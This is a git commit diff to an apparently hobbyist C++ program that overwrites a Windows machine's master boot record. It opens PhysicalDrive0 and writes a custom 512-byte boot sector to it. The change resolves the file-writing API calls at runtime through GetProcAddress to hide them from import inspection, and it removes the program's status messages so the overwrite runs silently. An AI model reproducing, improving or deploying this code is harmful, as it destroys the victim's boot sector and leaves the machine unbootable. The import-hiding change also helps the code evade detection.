b06a601777e19c7e57a957c2542f4d461d16aebb
MmCopyMemory <60398155+MmCopyMemory@users.noreply.github.com>
2024-04-04 18:04:01 +0200

    update 04 04 2024

--- mbr-text/main.cpp
+++ mbr-text/main.cpp
@@ -2,27 +2,31 @@
 #include <iostream>
 #include "byte.h"
 
+//This basically just defining the functions so we can actually use them after we get them with getprocaddress
+//Nerds call this Function Pointer Types
+typedef BOOL(WINAPI* LPWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef HANDLE(WINAPI* LPCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+typedef BOOL(WINAPI* LPCloseHandle)(HANDLE);
+
 /*
 To make it print your own text change the one in gay.asm
 convert to bin with any compiler like nasm and then to hex byte array :thumbs_up:
 Change in byte.h
 */
 int main(){
+	//Create Handle to kernal 64 and get adresses via GetProcAddress
+	HMODULE hKernel32 = LoadLibrary("kernel32.dll");
+	LPWriteFile pWriteFile = (LPWriteFile)GetProcAddress(hKernel32, "WriteFile");
+	LPCreateFileW pCreateFileW = (LPCreateFileW)GetProcAddress(hKernel32, "CreateFileW");
+	LPCloseHandle pCloseHandle = (LPCloseHandle)GetProcAddress(hKernel32, "CloseHandle");
+
 	DWORD dwBytesWritten;
+
 	//handle for mbr :thumbs_up:
-	HANDLE mhandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, NULL, NULL);
+	HANDLE mhandle = pCreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, NULL, NULL);
+
 	//write new data to handle or whatever
-	if (WriteFile(mhandle, newmbrdata, 512, &dwBytesWritten, 0) == TRUE){
-		std::cout << "gg(get gooder) :3" << std::endl;
-		//Sillyness overload
-		Sleep(5000);
-		ExitProcess(0);
-	} else
-	{
-		std::cout << "Oh no :( something else is accessing PhysicalDrive0";
-		Sleep(5000);
-		ExitProcess(0);
-	}
-	CloseHandle(mhandle);
+	pWriteFile(mhandle, newmbrdata, 512, &dwBytesWritten, 0);
+	pCloseHandle(mhandle);
 	return EXIT_SUCCESS;
 }
